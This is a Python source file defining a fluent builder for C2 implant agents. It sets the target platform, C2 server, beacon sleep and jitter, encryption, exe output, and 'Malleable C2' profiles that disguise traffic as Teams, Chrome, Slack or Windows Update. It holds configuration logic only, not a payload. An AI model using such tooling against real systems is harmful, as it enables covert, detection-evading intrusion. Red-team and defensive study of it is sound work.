"""
Agent Builder - BUILDER PATTERN

Constructs agents with many optional configurations including Malleable C2 profiles.
"""

from typing import List, Optional, Dict, Any
import uuid
import os

from app.services.agent_factory import AgentFactory


class AgentBuilder:
    """
    Builder for agent configuration.
    
    Step-by-step agent configuration with fluent interface.
    """
    
    def __init__(self):
        """Initialize builder with default configuration"""
        self._config = {
            # Required
            "platform": None,
            "c2_server": None,
            
            # Agent identification
            "agent_id": str(uuid.uuid4())[:8],
            "custom_name": None,
            
            # Features
            "features": [],
            
            # Beacon configuration
            "sleep_interval": 60,
            "jitter": 0.0,
            
            # Encryption
            "encryption_enabled": False,
            "encryption_key": None,
            
            # Communication
            "protocol": "http",
            "profile": "chrome_browser",  # ← ADDED: Malleable C2 profile
            
            # Output
            "output_format": "python",
        }
    
    # ============================================
    # REQUIRED SETTINGS
    # ============================================
    
    def set_platform(self, platform: str) -> 'AgentBuilder':
        """Set target platform."""
        self._config["platform"] = platform
        return self
    
    def set_c2_server(self, server_url: str) -> 'AgentBuilder':
        """Set C2 server URL."""
        self._config["c2_server"] = server_url
        return self
    
    # ============================================
    # AGENT IDENTIFICATION
    # ============================================
    
    def set_agent_id(self, agent_id: str) -> 'AgentBuilder':
        """Set custom agent ID."""
        self._config["agent_id"] = agent_id
        return self
    
    def set_custom_name(self, name: str) -> 'AgentBuilder':
        """Set custom filename (without extension)."""
        self._config["custom_name"] = name
        return self
    
    # ============================================
    # FEATURES
    # ============================================
    
    def add_feature(self, feature: str) -> 'AgentBuilder':
        """Add a feature to the agent."""
        if feature not in self._config["features"]:
            self._config["features"].append(feature)
        return self
    
    def add_features(self, features: List[str]) -> 'AgentBuilder':
        """Add multiple features at once."""
        for feature in features:
            self.add_feature(feature)
        return self
    
    def remove_feature(self, feature: str) -> 'AgentBuilder':
        """Remove a feature from the agent"""
        if feature in self._config["features"]:
            self._config["features"].remove(feature)
        return self
    
    # ============================================
    # BEACON CONFIGURATION
    # ============================================
    
    def set_beacon(self, sleep_interval: int, jitter: float = 0.0) -> 'AgentBuilder':
        """Configure beacon behavior."""
        self._config["sleep_interval"] = sleep_interval
        self._config["jitter"] = jitter
        return self
    
    # ============================================
    # COMMUNICATION PROFILE (MALLEABLE C2)
    # ============================================
    
    def set_profile(self, profile_name: str) -> 'AgentBuilder':
        """
        Set Malleable C2 communication profile.
        
        Args:
            profile_name: Profile name (microsoft_teams, chrome_browser, slack, windows_update)
        
        Returns:
            self
        """
        self._config["profile"] = profile_name
        return self
    
    # ============================================
    # ENCRYPTION
    # ============================================
    
    def enable_encryption(self, key: Optional[str] = None) -> 'AgentBuilder':
        """Enable encryption for agent communications."""
        self._config["encryption_enabled"] = True
        if key:
            self._config["encryption_key"] = key
        else:
            # Generate random key
            import base64
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            key = AESGCM.generate_key(bit_length=256)
            self._config["encryption_key"] = base64.b64encode(key).decode()
        return self
    
    def disable_encryption(self) -> 'AgentBuilder':
        """Disable encryption"""
        self._config["encryption_enabled"] = False
        return self
    
    # ============================================
    # OUTPUT FORMAT
    # ============================================
    
    def set_output_format(self, format: str) -> 'AgentBuilder':
        """Set output format (python or exe)."""
        self._config["output_format"] = format
        return self
    
    # ============================================
    # BUILD
    # ============================================
    
    def build(self) -> Dict[str, Any]:
        """
        Build and return the final configuration.
        
        Validates configuration and returns a dictionary.
        """
        
        # Validate required fields
        if not self._config["platform"]:
            raise ValueError("Platform must be set (use .set_platform())")
        
        if not self._config["c2_server"]:
            raise ValueError("C2 server must be set (use .set_c2_server())")
        
        # Validate platform
        if self._config["platform"] not in AgentFactory.get_supported_platforms():
            raise ValueError(f"Unsupported platform: {self._config['platform']}")
        
        # Validate features
        available_features = AgentFactory.get_features_for_platform(
            self._config["platform"]
        )
        for feature in self._config["features"]:
            if feature not in available_features:
                raise ValueError(
                    f"Feature '{feature}' not available for {self._config['platform']}. "
                    f"Available: {', '.join(available_features)}"
                )
        
        # Validate jitter
        if not 0 <= self._config["jitter"] <= 1:
            raise ValueError("Jitter must be between 0 and 1")
        
        # Validate profile
        from app.services.communication.profiles import AVAILABLE_PROFILES
        if self._config["profile"] not in AVAILABLE_PROFILES:
            raise ValueError(
                f"Invalid profile: {self._config['profile']}. "
                f"Available: {', '.join(AVAILABLE_PROFILES.keys())}"
            )
        
        # Return a copy of the configuration
        return self._config.copy()
    
    def get_config(self) -> Dict[str, Any]:
        """Get current configuration without validation."""
        return self._config.copy()